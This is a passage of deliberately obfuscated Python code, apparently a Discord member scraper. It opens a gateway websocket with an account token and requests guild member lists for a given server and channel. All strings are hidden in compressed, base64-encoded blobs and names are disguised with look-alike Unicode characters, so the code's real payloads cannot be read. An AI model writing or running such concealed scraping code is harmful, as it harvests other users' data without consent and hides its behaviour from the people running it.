                    𝘮𝗲𝘮𝗯𝘦𝗿𝘥𝙖𝙩𝙖[__𝙞𝗺𝙥𝙤𝗿𝘵__(𝙡𝘔𝙄𝗜𝗠𝗹𝗠𝙉𝘐𝙄𝙉𝘔𝘭𝙡𝘐𝘔𝙡𝙈𝘭𝗜𝘔𝘐𝙈𝗜𝘕𝘔𝗜𝗹𝙡𝙡𝘕𝗹[𝗿𝙤𝙪𝗻𝗱(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝘰𝘳𝙩__(𝙡𝗠𝘐𝘐𝙈𝙡𝗠𝙉𝗜𝘐𝙉𝘔𝘭𝘭𝙄𝘔𝘭𝗠𝘭𝗜𝙈𝙄𝘔𝗜𝘕𝙈𝗜𝘭𝘭𝘭𝙉𝘭[𝙧𝗼𝙪𝗻𝙙(𝘢𝘣𝙨(0.022985992680523926 + 0.9997357871660346j))]).decompress(b'x\xdaK\x89p\xca\x8e\x8c\x08\xcaI.\xb7\xb5\x05\x00\x1b\xbb\x04-')).decode()].append(𝗰𝘩𝘂𝙣𝙠[__𝗶𝙢𝙥𝗼𝘳𝘵__(𝙡𝘔𝗜𝘐𝘔𝙡𝘔𝗡𝗜𝙄𝘕𝙈𝘭𝘭𝗜𝗠𝗹𝗠𝘭𝘐𝗠𝗜𝗠𝘐𝘕𝗠𝘐𝗹𝗹𝘭𝘕𝘭[𝗿𝘰𝘂𝙣𝘥(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝗼𝘳𝘁__(𝗹𝘔𝘐𝙄𝗠𝙡𝘔𝘕𝙄𝙄𝗡𝘔𝗹𝙡𝗜𝗠𝗹𝙈𝘭𝗜𝙈𝙄𝘔𝘐𝘕𝙈𝗜𝗹𝘭𝘭𝙉𝗹[𝘳𝙤𝘂𝗻𝙙(𝙖𝙗𝙨(0.8466906989628111 + 0.5320853881567003j))]).decompress(b'x\xdaK\x8c\x08\xcaI\n\xb4\xb5\x05\x00\x0c\xb2\x02\xa5')).decode()])
        return 𝙢𝗲𝘮𝗯𝗲𝘳𝗱𝗮𝘁𝙖

class DiscordSocket(𝘄𝘦𝗯𝘀𝗼𝗰𝙠𝙚𝙩.WebSocketApp):

    def __init__(self, token, guild_id, channel_id):
        𝘀𝗲𝘁𝗮𝘵𝘁𝘳(𝘀𝙚𝘭𝘧, 'token', 𝘵𝘰𝙠𝗲𝙣)
        𝙨𝙚𝘁𝗮𝘵𝘵𝘳(𝘀𝗲𝘭𝗳, 'guild_id', 𝘨𝘶𝗶𝘭𝗱_𝙞𝙙)
        𝙨𝙚𝙩𝘢𝘁𝘁𝘳(𝘴𝘦𝗹𝘧, 'channel_id', 𝘤𝙝𝙖𝘯𝘯𝘦𝘭_𝗶𝙙)
        𝘀𝗲𝙡𝘧.blacklisted_roles, 𝘀𝘦𝘭𝗳.blacklisted_users = ([], [])
        𝙨𝙚𝙩𝗮𝙩𝙩𝗿(𝘴𝙚𝗹𝘧, 'socket_headers', {__𝘪𝙢𝘱𝗼𝙧𝙩__(𝙡𝘔𝗜𝗜𝗠𝙡𝘔𝘕𝙄𝙄𝗡𝗠𝙡𝗹𝗜𝘔𝙡𝙈𝙡𝗜𝙈𝗜𝙈𝗜𝙉𝘔𝙄𝙡𝘭𝗹𝘕𝙡[𝗿𝘰𝘶𝗻𝙙(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝙤𝗿𝙩__(𝙡𝗠𝘐𝗜𝘔𝗹𝗠𝙉𝘐𝘐𝘕𝙈𝙡𝗹𝗜𝙈𝘭𝘔𝙡𝙄𝘔𝘐𝙈𝙄𝙉𝙈𝘐𝘭𝙡𝙡𝙉𝙡[𝙧𝙤𝙪𝘯𝙙(𝙖𝘣𝙨(0.0034841958678832885 + 0.9999939301711557j))]).decompress(b'x\xda\x0b\x0c\xf7\xcb\x8a\x8ap2\xf0\t\r+\x8d4\xb2\xccN\x0c7\xcd\x03\x00C\xdb\x06{')).decode(): __𝘪𝙢𝙥𝙤𝗿𝘁__(𝘭𝙈𝗜𝗜𝗠𝗹𝘔𝘕𝗜𝗜𝗡𝙈𝘭𝙡𝗜𝘔𝗹𝙈𝗹𝙄𝙈𝗜𝗠𝙄𝙉𝘔𝘐𝘭𝘭𝘭𝗡𝗹[𝙧𝘰𝘶𝗻𝗱(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝘰𝙧𝘵__(𝘭𝘔𝙄𝗜𝘔𝘭𝘔𝙉𝘐𝙄𝗡𝗠𝗹𝗹𝙄𝘔𝙡𝙈𝗹𝗜𝗠𝙄𝙈𝗜𝙉𝗠𝙄𝘭𝘭𝘭𝙉𝙡[𝙧𝘰𝘶𝙣𝘥(𝗮𝘣𝙨(0.7182059344317339 + 0.6958306085154922j))]).decompress(b'x\xda\x8b2.(Hv.O\x8fr\x0f\xcbMrw3\x88\n.O\x8f\xcc\xf3\xb4\x05\x00iM\x08M')).decode(), __𝗶𝗺𝘱𝘰𝘳𝘵__(𝙡𝗠𝗜𝙄𝗠𝘭𝘔𝘕𝗜𝘐𝙉𝗠𝗹𝙡𝗜𝘔𝙡𝙈𝘭𝘐𝙈𝙄𝗠𝙄𝙉𝘔𝙄𝗹𝙡𝗹𝙉𝘭[𝙧𝙤𝘶𝗻𝙙(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝙤𝘳𝘁__(𝗹𝙈𝗜𝙄𝗠𝘭𝘔𝗡𝘐𝙄𝙉𝘔𝙡𝗹𝗜𝘔𝙡𝗠𝙡𝘐𝘔𝘐𝗠𝙄𝙉𝘔𝘐𝘭𝘭𝘭𝗡𝗹[𝘳𝗼𝘂𝗻𝘥(𝘢𝗯𝘴(0.07244562786258779 + 0.9973723632643906j))]).decompress(b'x\xda\x0b\x0c\xf7\xcb\x8a\x8ap2\xf0\t\xad\xc8H\xcaM1\x8c\x0cO\xc9\x01\x00F\xbb\x06\xea')).decode(): __𝙞𝙢𝙥𝗼𝙧𝘁__(𝙡𝙈𝘐𝗜𝗠𝘭𝙈𝘕𝙄𝗜𝗡𝘔𝙡𝗹𝘐𝙈𝗹𝘔𝗹𝘐𝘔𝗜𝘔𝙄𝗡𝘔𝘐𝙡𝘭𝙡𝙉𝙡[𝙧𝘰𝙪𝙣𝘥(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝘰𝗿𝘵__(𝘭𝙈𝗜𝘐𝘔𝙡𝗠𝘕𝗜𝘐𝙉𝘔𝗹𝗹𝗜𝙈𝘭𝙈𝙡𝘐𝗠𝗜𝙈𝙄𝗡𝙈𝙄𝙡𝙡𝗹𝙉𝙡[𝗿𝗼𝘂𝘯𝙙(𝙖𝘣𝘀(0.9543686634211596 + 0.29863096671261247j))]).decompress(b'x\xda\x8b\n7)\t\x0b\xf3-\x8e\n71O\x0e1(\xf7\xc9\xca\xb6\x05\x00E\xa8\x06\x9e')).decode(), __𝗶𝗺𝗽𝗼𝙧𝘁__(𝗹𝙈𝙄𝗜𝗠𝘭𝘔𝗡𝙄𝘐𝘕𝗠𝗹𝙡𝘐𝘔𝙡𝙈𝗹𝘐𝗠𝗜𝙈𝘐𝗡𝗠𝗜𝗹𝙡𝗹𝘕𝙡[𝘳𝘰𝘂𝗻𝗱(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝙤𝘳𝘵__(𝘭𝗠𝙄𝙄𝗠𝘭𝘔𝘕𝗜𝙄𝗡𝗠𝙡𝘭𝙄𝙈𝙡𝘔𝗹𝗜𝗠𝗜𝗠𝗜𝙉𝙈𝙄𝗹𝗹𝗹𝗡𝗹[𝙧𝙤𝙪𝙣𝙙(𝘢𝗯𝘀(0.3596446982101805 + 0.9330893264041273j))]).decompress(b'x\xda\x0b4r\xcbJt\x0f-\t4\xb2,M\xf1\xf0*Kr\xb4\xb5\x05\x00CD\x06_')).decode(): __𝙞𝘮𝗽𝗼𝗿𝘁__(𝘭𝘔𝗜𝙄𝙈𝘭𝗠𝘕𝙄𝗜𝗡𝗠𝗹𝘭𝘐𝗠𝘭𝗠𝙡𝙄𝗠𝘐𝙈𝘐𝘕𝘔𝙄𝙡𝙡𝗹𝘕𝙡[𝗿𝗼𝙪𝙣𝙙(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝘰𝗿𝘁__(𝙡𝙈𝗜𝗜𝗠𝘭𝘔𝗡𝙄𝘐𝘕𝘔𝘭𝗹𝙄𝙈𝗹𝗠𝘭𝘐𝘔𝘐𝗠𝘐𝘕𝗠𝗜𝙡𝗹𝗹𝙉𝙡[𝗿𝗼𝘶𝙣𝙙(𝗮𝗯𝘴(0.1628723442236485 + 0.986647150447967j))]).decompress(b'x\xdaK\xca\xb5(\x894r\xcbJt\x0f\xb5\x05\x00\x1a\xb3\x03\xf1')).decode(), __𝘪𝙢𝘱𝙤𝘳𝙩__(𝙡𝗠𝘐𝙄𝘔𝗹𝙈𝙉𝗜𝙄𝙉𝘔𝘭𝙡𝙄𝙈𝗹𝙈𝙡𝗜𝗠𝙄𝙈𝗜𝙉𝗠𝙄𝙡𝗹𝗹𝗡𝘭[𝘳𝙤𝙪𝗻𝘥(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝗼𝙧𝘁__(𝗹𝗠𝗜𝗜𝗠𝘭𝙈𝙉𝘐𝗜𝙉𝘔𝗹𝙡𝙄𝘔𝙡𝙈𝗹𝗜𝙈𝗜𝘔𝘐𝗡𝘔𝗜𝘭𝗹𝗹𝙉𝙡[𝗿𝙤𝘶𝙣𝙙(𝙖𝘣𝙨(0.6767408105183356 + 0.736221349445251j))]).decompress(b'x\xda\x0b\xf5\xf0\xca\x8822\xcc\x00\x00\x0b4\x02u')).decode(): __𝙞𝙢𝗽𝗼𝙧𝘁__(𝙡𝙈𝙄𝘐𝗠𝙡𝗠𝙉𝗜𝗜𝘕𝗠𝙡𝘭𝘐𝙈𝗹𝙈𝙡𝘐𝘔𝘐𝙈𝙄𝗡𝗠𝙄𝙡𝘭𝘭𝗡𝘭[𝘳𝙤𝘂𝘯𝙙(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝘰𝙧𝘁__(𝘭𝘔𝗜𝘐𝙈𝙡𝙈𝘕𝗜𝙄𝗡𝘔𝗹𝘭𝘐𝙈𝘭𝙈𝙡𝘐𝙈𝘐𝗠𝗜𝙉𝗠𝗜𝗹𝗹𝙡𝘕𝙡[𝗿𝗼𝙪𝗻𝗱(𝗮𝗯𝘀(0.8299184150573877 + 0.5578847769464887j))]).decompress(b'x\xdaK\xca\xb5(\x894r\xcbJt\x0f\xb5\x05\x00\x1a\xb3\x03\xf1')).decode(), __𝘪𝙢𝙥𝗼𝘳𝙩__(𝗹𝗠𝘐𝗜𝙈𝘭𝙈𝘕𝘐𝙄𝙉𝗠𝘭𝙡𝗜𝗠𝘭𝘔𝘭𝘐𝗠𝙄𝘔𝙄𝗡𝗠𝘐𝗹𝗹𝘭𝗡𝙡[𝗿𝘰𝘂𝗻𝙙(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝘰𝗿𝘵__(𝙡𝙈𝙄𝗜𝙈𝗹𝘔𝗡𝗜𝘐𝗡𝙈𝘭𝘭𝙄𝙈𝙡𝘔𝙡𝙄𝙈𝘐𝙈𝘐𝘕𝙈𝙄𝗹𝗹𝙡𝗡𝗹[𝗿𝗼𝘶𝗻𝗱(𝗮𝙗𝘴(0.31770795498481985 + 0.9481886180182526j))]).decompress(b'x\xda\x0b5\n\xcb\xf2\tK\xc9\x89\xcc\xf1+\x8b4*\xc9Iq6tK\xf5\x08\xcaI\xca\xf3+H22\xad\x02\x00\xb5\xbb\x0b\x08')).decode(): __𝗶𝙢𝘱𝘰𝗿𝙩__(𝙡𝘔𝙄𝙄𝘔𝗹𝗠𝗡𝗜𝗜𝙉𝙈𝘭𝙡𝗜𝙈𝗹𝗠𝘭𝗜𝙈𝗜𝗠𝗜𝗡𝗠𝗜𝙡𝙡𝗹𝗡𝗹[𝘳𝘰𝙪𝗻𝙙(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝗼𝙧𝙩__(𝙡𝙈𝗜𝘐𝗠𝗹𝗠𝗡𝗜𝙄𝘕𝘔𝗹𝗹𝗜𝗠𝙡𝗠𝙡𝗜𝗠𝘐𝙈𝘐𝙉𝘔𝗜𝘭𝙡𝙡𝗡𝘭[𝘳𝗼𝘂𝘯𝗱(𝙖𝗯𝙨(0.5006686466938269 + 0.8656390161133981j))]).decompress(b'x\xdaKv\x0f\xabL\n\x0f\xabJ6r\xcb\x8b\n6\xcc\x8e\n\x8f*\x8e\x8c\x08\xca\xf1\xaft\xcaJr\xcf\xc9I\xca\x0bJK\nw3\x890N)H\xca\r*K1\xb4\xccL\x8c\x08\xaa\x02\x007z\x13\xe4')).decode(), __𝙞𝗺𝘱𝘰𝗿𝘵__(𝙡𝘔𝘐𝘐𝗠𝘭𝙈𝗡𝙄𝙄𝘕𝘔𝙡𝙡𝘐𝘔𝘭𝗠𝘭𝗜𝘔𝙄𝘔𝗜𝙉𝗠𝗜𝘭𝙡𝗹𝙉𝗹[𝙧𝘰𝘂𝘯𝗱(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝙤𝙧𝘁__(𝗹𝙈𝗜𝙄𝗠𝘭𝙈𝗡𝗜𝘐𝘕𝘔𝘭𝘭𝙄𝘔𝙡𝙈𝙡𝙄𝗠𝗜𝗠𝘐𝙉𝗠𝙄𝙡𝙡𝙡𝙉𝙡[𝗿𝘰𝘂𝘯𝗱(𝗮𝘣𝘴(0.8358616894567676 + 0.5489401024688195j))]).decompress(b'x\xda\x0b\x8b\xf0\xcbI\xce4t\x8a2\n+Mq\xb4\xb5\x05\x00-@\x05\x1e')).decode(): __𝗶𝘮𝙥𝘰𝗿𝘵__(𝘭𝙈𝙄𝗜𝗠𝗹𝘔𝘕𝙄𝘐𝙉𝗠𝙡𝗹𝗜𝘔𝘭𝘔𝘭𝗜𝙈𝙄𝙈𝙄𝘕𝘔𝘐𝗹𝙡𝗹𝙉𝘭[𝘳𝙤𝘂𝙣𝘥(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝘰𝘳𝙩__(𝗹𝙈𝘐𝙄𝗠𝘭𝘔𝗡𝗜𝗜𝘕𝗠𝘭𝗹𝙄𝘔𝗹𝘔𝗹𝗜𝘔𝗜𝘔𝘐𝗡𝘔𝗜𝙡𝗹𝘭𝘕𝗹[𝘳𝘰𝙪𝗻𝙙(𝘢𝙗𝘀(0.6556437358320107 + 0.755070388549468j))]).decompress(b'x\xdaE\x8dK\x0e\x83 \x00\x05\xcf$6\xad.\xbaP\xfc\xb6@\x82PQvR\x13\xa8b\xd2h\xfc\xf5\xf45\xddt\xfdf\xe6q\xe1\x9f\x1b\xb1M5\xf3\x1c\xd4\x05\xfa\x9e\xb4o5\x14K\xebb\xcd-\xd5\x98\x073\x8e&]\x02;\x93\x8e^\xf2L\x03\x02{M\xabpUiYIqCME\x17\xc2\xb1\x8b:\x0crh\x10K\n\xc2\xe1\xaaUjG\xc9\xc2L\n2\xaa\xfdp\x80\xd9\x15p,\xfa\xc4\x1ba\xa7\xf5\xf8\x9b1\x0cy-\xa4y\x0e\xfd\xbf\x11\xfb\xf4\xf1\xf26\x1c\xc5\xc7\xfe\xe3\xae_\xad\x1589')).decode()})
        𝙨𝙪𝗽𝗲𝗿().__init__(__𝙞𝗺𝘱𝙤𝙧𝘵__(𝗹𝗠𝙄𝗜𝘔𝘭𝗠𝙉𝘐𝙄𝘕𝙈𝙡𝘭𝘐𝗠𝙡𝘔𝘭𝗜𝘔𝙄𝗠𝙄𝘕𝘔𝘐𝘭𝙡𝗹𝘕𝘭[𝙧𝗼𝘶𝙣𝗱(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝙤𝘳𝘵__(𝘭𝘔𝘐𝗜𝗠𝘭𝗠𝙉𝘐𝙄𝙉𝙈𝘭𝗹𝗜𝘔𝘭𝙈𝙡𝘐𝗠𝗜𝙈𝘐𝘕𝘔𝗜𝗹𝙡𝙡𝘕𝘭[𝘳𝗼𝘶𝗻𝙙(𝗮𝘣𝘴(0.6263700539152244 + 0.7795258530403202j))]).decompress(b'x\xdaK1\xf6\xab\xf2\xcf\xb4(\x8b2r3\x88\x8aH\xc9H\r6\xcdN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9M\xc9\xf3\xa9\xb2\xccI\xca\xf5+\x8br\xcf)\x8d\xaa2,L6\xb2,\xf5\xca\x8b\xb4\xf4\x0f\xb4\xb5\x05\x00r\xf9\x14\x81')).decode(), header=𝘴𝗲𝘭𝙛.socket_headers, on_open=lambda ws: 𝘴𝗲𝗹𝗳.sock_open(𝘄𝘀), on_message=lambda ws, msg: 𝙨𝘦𝗹𝘧.sock_message(𝙬𝙨, 𝘮𝙨𝗴), on_close=lambda ws, close_code, close_msg: 𝘀𝘦𝙡𝙛.sock_close(𝘸𝙨, 𝘤𝘭𝗼𝘴𝘦_𝘤𝘰𝘥𝙚, 𝘤𝘭𝘰𝘴𝙚_𝗺𝘀𝘨))
        𝘀𝗲𝘁𝗮𝘁𝘁𝘳(𝘴𝗲𝙡𝗳, 'endScraping', False)
        𝘴𝙚𝙩𝗮𝙩𝙩𝗿(𝘀𝘦𝙡𝙛, 'guilds', {})
        𝙨𝙚𝘁𝗮𝘁𝘁𝘳(𝘀𝘦𝘭𝗳, 'members', {})
        𝘀𝙚𝙩𝙖𝘵𝙩𝘳(𝘴𝘦𝗹𝙛, 'ranges', [[𝗿𝘰𝙪𝗻𝗱(𝗮𝗯𝙨(0.0 + 0j)), 𝙧𝗼𝙪𝙣𝘥(𝗮𝘣𝘀(0.0 + 0j))]])
        𝘀𝗲𝙩𝗮𝘵𝘁𝗿(𝘴𝙚𝗹𝙛, 'lastRange', 𝘳𝘰𝘶𝗻𝗱(𝘢𝙗𝘀(0.0 + 0j)))
        𝘴𝗲𝙩𝙖𝘵𝘵𝘳(𝘀𝗲𝙡𝘧, 'packets_recv', 𝗿𝗼𝘂𝗻𝙙(𝘢𝙗𝘴(0.0 + 0j)))

    def run(self):
        𝘀𝙚𝘭𝙛.run_forever()
        return 𝘴𝘦𝗹𝗳.members

    def scrapeUsers(self):
        if 𝙨𝘦𝙡𝘧.endScraping == False:
            𝙨𝙚𝙡𝘧.send(__𝙞𝙢𝙥𝗼𝙧𝙩__(𝗹𝗠𝙄𝙄𝙈𝘭𝗠𝗡𝘐𝘐𝘕𝗠𝘭𝘭𝘐𝙈𝗹𝘔𝗹𝘐𝘔𝙄𝙈𝙄𝗡𝗠𝗜𝙡𝙡𝙡𝙉𝙡[𝗿𝙤𝙪𝙣𝙙(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝗼𝗿𝙩__(𝙡𝙈𝗜𝙄𝗠𝘭𝗠𝙉𝗜𝗜𝗡𝗠𝘭𝘭𝘐𝗠𝗹𝘔𝘭𝗜𝙈𝙄𝘔𝗜𝗡𝗠𝘐𝗹𝘭𝙡𝙉𝗹[𝘳𝙤𝙪𝘯𝙙(𝗮𝗯𝘴(0.741383991691957 + 0.6710810508894587j))]).decompress(b'x\xdaK\xad\xf4*Kv\xf64\xf3\r\t,\xf6\xcc\r\xcc\xf4\xcf+\xce\x8c2\x0e+Hr\x0fJK\x0c\x07\xf23=m\x01\xeb\x80\x0c\x96')).decode() + 𝘴𝗲𝙡𝗳.guild_id + __𝗶𝙢𝗽𝙤𝙧𝘁__(𝙡𝘔𝘐𝘐𝗠𝘭𝙈𝙉𝘐𝗜𝘕𝗠𝙡𝘭𝙄𝗠𝗹𝗠𝙡𝘐𝗠𝘐𝘔𝗜𝘕𝗠𝘐𝗹𝙡𝙡𝘕𝙡[𝘳𝙤𝘶𝘯𝗱(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝘰𝙧𝘁__(𝘭𝙈𝙄𝗜𝘔𝘭𝙈𝙉𝘐𝘐𝗡𝙈𝘭𝙡𝙄𝘔𝘭𝘔𝘭𝗜𝙈𝘐𝙈𝘐𝘕𝘔𝙄𝗹𝗹𝙡𝗡𝙡[𝘳𝗼𝘶𝙣𝘥(𝗮𝙗𝘀(0.5814766042096251 + 0.813563125244036j))]).decompress(b'x\xda\xf3\xcc,\xcfL\xf1\xc8)O\x0c7\xcd\xf3\xcc*0H\xce\x0b\xcb\xf1q\xf6\xca\x884\x0e*H\xc9\xcd1H\x0c\x0f\xabB\x127H\xf4\xf0\xca\x89\x0c\x0fB\x16\xcbJtw+M\xca\r+N\xae\xf44K\xad\xf4\xb4\x05\x00\xf1\x1a\x1d\x94')).decode() + 𝘴𝘦𝘭𝙛.channel_id + __𝗶𝗺𝘱𝗼𝗿𝙩__(𝗹𝗠𝗜𝘐𝘔𝘭𝘔𝗡𝗜𝙄𝙉𝘔𝙡𝗹𝙄𝘔𝘭𝙈𝘭𝘐𝘔𝙄𝗠𝗜𝗡𝗠𝗜𝙡𝙡𝙡𝗡𝘭[𝘳𝙤𝘂𝘯𝗱(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝗼𝘳𝙩__(𝙡𝙈𝗜𝗜𝙈𝗹𝘔𝗡𝘐𝙄𝘕𝘔𝗹𝙡𝙄𝘔𝗹𝙈𝙡𝘐𝗠𝗜𝗠𝙄𝘕𝗠𝗜𝘭𝗹𝗹𝘕𝘭[𝗿𝙤𝘂𝗻𝙙(𝙖𝘣𝘴(0.07870158573880248 + 0.9968982196805238j))]).decompress(b'x\xda\xf3\xcc\xca\xb7\x05\x00\x03\x81\x01`')).decode() + 𝙟𝘀𝗼𝗻.dumps(𝘴𝙚𝙡𝘧.ranges) + __𝙞𝗺𝗽𝗼𝗿𝙩__(𝗹𝗠𝙄𝙄𝘔𝙡𝘔𝗡𝘐𝙄𝙉𝙈𝗹𝘭𝗜𝗠𝗹𝗠𝘭𝙄𝗠𝙄𝙈𝗜𝗡𝘔𝙄𝗹𝙡𝘭𝗡𝗹[𝙧𝗼𝙪𝙣𝙙(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝗼𝙧𝘵__(𝘭𝘔𝙄𝙄𝘔𝙡𝙈𝘕𝙄𝘐𝙉𝗠𝙡𝙡𝘐𝙈𝘭𝘔𝙡𝘐𝗠𝘐𝗠𝘐𝙉𝘔𝗜𝗹𝙡𝙡𝗡𝙡[𝗿𝘰𝘶𝘯𝙙(𝙖𝘣𝙨(0.819853582649296 + 0.5725732293926376j))]).decompress(b'x\xdaK\x8b0\xb4\x04\x00\x03?\x01)')).decode())

    def sock_open(self, ws):
        𝘴𝗲𝙡𝙛.send(__𝘪𝗺𝙥𝗼𝗿𝙩__(𝘭𝗠𝙄𝙄𝗠𝙡𝗠𝙉𝘐𝗜𝗡𝙈𝗹𝗹𝙄𝗠𝘭𝙈𝗹𝘐𝗠𝘐𝘔𝙄𝙉𝗠𝗜𝗹𝘭𝙡𝗡𝗹[𝙧𝗼𝘶𝗻𝗱(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝘰𝗿𝙩__(𝗹𝘔𝘐𝙄𝙈𝗹𝗠𝗡𝘐𝙄𝗡𝗠𝘭𝙡𝗜𝙈𝙡𝗠𝗹𝘐𝙈𝘐𝙈𝙄𝙉𝙈𝘐𝙡𝙡𝙡𝗡𝙡[𝘳𝙤𝘂𝙣𝗱(𝘢𝗯𝙨(0.3655328284145545 + 0.9307984482965449j))]).decompress(b'x\xdaK\xad\xf4*Kv\xf64\xf3\xcd,\xcf\x8c\x02\xd2\xa9\x95^\x06IF%9I\x99\x9ef\x9e\xe9\xb6\xb6\x00\xb6\xf5\n\xb6')).decode() + 𝙨𝗲𝗹𝗳.token + __𝘪𝙢𝙥𝙤𝗿𝘵__(𝗹𝙈𝙄𝘐𝘔𝙡𝗠𝗡𝘐𝙄𝘕𝗠𝙡𝙡𝘐𝙈𝗹𝙈𝘭𝗜𝙈𝗜𝘔𝗜𝗡𝗠𝙄𝗹𝘭𝗹𝗡𝘭[𝘳𝘰𝘶𝙣𝘥(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝗼𝙧𝙩__(𝘭𝙈𝗜𝗜𝙈𝘭𝙈𝙉𝘐𝘐𝗡𝘔𝗹𝙡𝙄𝗠𝗹𝘔𝗹𝙄𝗠𝘐𝙈𝙄𝘕𝗠𝘐𝘭𝙡𝙡𝗡𝙡[𝗿𝗼𝘶𝙣𝗱(𝗮𝙗𝘴(0.12227766902160209 + 0.9924959302982777j))]).decompress(b'x\xdauR\xddv\xa3 \x18|%\xc5\xa4\xad\x17\xbdh\xdd\xe8\xe2\xa9\xf4\xd4TA\xee\x82\xd4\x8a\x01\xe3Yc4>\xfd~\x98\xecOzv\xafD\xf8\x98\x19f\x06\xabQ\x15(\x1c\x0b\x1aw"\xd2\xce\x8e\xe63n\x0eS\xd2d=n\x9f\xcf\xc2{\xd6e\x9bv\x9c%\xea\xb5\xed\x95\xf0\xe0\xabb\xb6\xa3\xeb\xbd\xf0\xe4\x8c7\xeb\x0c[\x8c6>I\x8f\xe8R\xe1;\xbc\'\x87\xd2\xf8G\xbe\xc5=6\xa9\x96F7\xb0\xbe\xc3\n\xfe[\xb2.\xbdT\x8b\xdc\xef\x05"\xb5\x882\x8b\xd7\xc9\xc0\x8d\xf3\xc0\xce\xc7g\x8b\xcbY\\I\x06x\xda\xaf9\xca\x07\x19X\\\xf7\xf4at/\xa2\xcd\x89lW#\x0e\xea[\x1d\xdf6\xe3K\xf3t\x8fC\xd9\x89\xa6p^\xcf\xcf+\xd2\xbcux\x13\x8ee4\xe9\x1c\xe5j\x8b\xb4\xf32g39\xaff\xa2\x9e\x0e[\xa7\xce\xde\xb3\xb1\xc7\xd1\xd4\xedP\xf6\x99\xa2\xbc\xd9\xa1\x07\xb8\xf3\xeb\r\x0fS\xf2^\x0cI\xb0\xb2\xd8\x9f\x19\nM\xc1\xe2\xee\x0f\xc6\x17\xcd&?\x97H\x9f\x84\xf5\xa1\xd9LD\x81N\xf0Gx\xe4\xeb\xd9\xb2_\x9a\xdc\xc0\xbd3g\x18|\xc0\xea%\x805\xe5\xe09\xe4ad\xc5#\xffXP=@&\xeav>\xae\n\x0f\xf0\xcc\xd5\x9b\xc5\xdbXs\xcba\xf4\xc0]\x7f/\x90[\x83?\xff\x9c\x13Q^\x97(\xaf\nT\xd7\xc2\xac\xb5\xb0g-q\xa0\x07\xfd%7\xd2C\x17\x06\x19\xfaJR\xdd\xf3\xd0\x1f$u\xd5\xa2\x13\xb4\'\xf3~\x95lmw\xa6\x8e\xd3\xb5\xc3P\x8e\x96\xafGN\x92\xc5K\xde\xa2\xcd{\xf1\xddYz\xc4!Ka\x88\xc6Mw\xbf\xf0\xb0\xd4-\xcf\xc0i\xfc\x01z7,\x9c-\xe9.3\x87\x11|\xa8\x0b/\xed\xa0;\xd7Nv\x82Y>\xca\x7f\xc0\xda\x14t\x02\xbf\x1d\xab\xf3$\xd8\x82?\xff\xde\xff[\x97\xb7p]x\x8dtwt\xda3xs\x89jm\xf9?<\x8bQw\xdc\xfe{i%\xa2p\x867\x1f-^A\xa5fH\xef\xad\xf7Ip\xf1\xad\xa0i\x05s\xb5\x8c\xf2\x9b<\x93`T\xd7\xbe\xb6W\xbf@_\n\xda\xd7m\xe9\xfa\x08\xf2\x9aw\xd4\xb79\x1e\xado\xd7\xd9\xff\xcf0\xd7\xaf\xde\x1e\x1f\x7f\x02J\xc6D\x1d')).decode())

    def heartbeatThread(self, interval):
        try:
            while True:
                𝙨𝘦𝙡𝙛.send(__𝗶𝗺𝙥𝙤𝙧𝘁__(𝙡𝘔𝗜𝙄𝘔𝗹𝙈𝘕𝙄𝗜𝗡𝘔𝘭𝗹𝘐𝘔𝙡𝙈𝗹𝘐𝙈𝙄𝘔𝙄𝗡𝙈𝘐𝗹𝗹𝙡𝗡𝘭[𝘳𝗼𝘂𝙣𝘥(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝘰𝗿𝙩__(𝘭𝙈𝙄𝘐𝘔𝘭𝗠𝙉𝘐𝘐𝗡𝙈𝘭𝙡𝘐𝘔𝘭𝙈𝙡𝗜𝘔𝘐𝘔𝗜𝙉𝘔𝗜𝘭𝗹𝘭𝘕𝙡[𝙧𝙤𝙪𝗻𝗱(𝗮𝘣𝘴(0.1091497816860606 + 0.9940253141434001j))]).decompress(b'x\xdaK\xad\xf4*Kv\xf64\xf3\r.\xcf\x8c\x02\xd2\x000C\x05`')).decode() + 𝙟65𝙟1𝘨𝘊𝗯8𝙕82𝘇7𝘀𝙅𝙟𝘮𝘹𝗼𝗯𝗪𝗠7𝘤7𝙒1𝙎𝗛𝙅𝘤.mro()[10](𝙨𝘦𝗹𝘧.packets_recv) + __𝘪𝙢𝘱𝙤𝙧𝘁__(𝘭𝙈𝘐𝗜𝘔𝙡𝗠𝘕𝘐𝙄𝘕𝘔𝗹𝙡𝗜𝗠𝗹𝗠𝗹𝙄𝘔𝘐𝘔𝘐𝘕𝗠𝗜𝗹𝗹𝗹𝙉𝗹[𝗿𝘰𝘂𝘯𝗱(𝙖𝘣𝘴(0.0 + 